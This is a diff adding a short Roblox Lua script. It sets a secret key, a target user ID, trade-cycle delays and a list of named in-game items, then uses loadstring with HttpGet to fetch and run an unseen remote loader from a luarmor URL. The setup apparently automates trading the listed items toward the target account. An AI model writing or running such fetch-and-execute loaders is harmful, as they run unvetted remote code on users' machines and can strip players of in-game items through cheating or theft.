@@ -1,0 +1,17 @@
+getgenv().SECRET_KEY = "mrr_0fe06fdd74f5430a9f05c45e7d736503"
+getgenv().TARGET_ID = 7930749228
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Esok Sekolah"] = true,
+    ["Los Nooo My Hotspotsitos"] = true,
+    ["Mieteteira Bicicleteira"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Los Burritos"] = true,
+    ["Garama and Madundung"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Money Money Puggy"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tang Tang Keletang"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
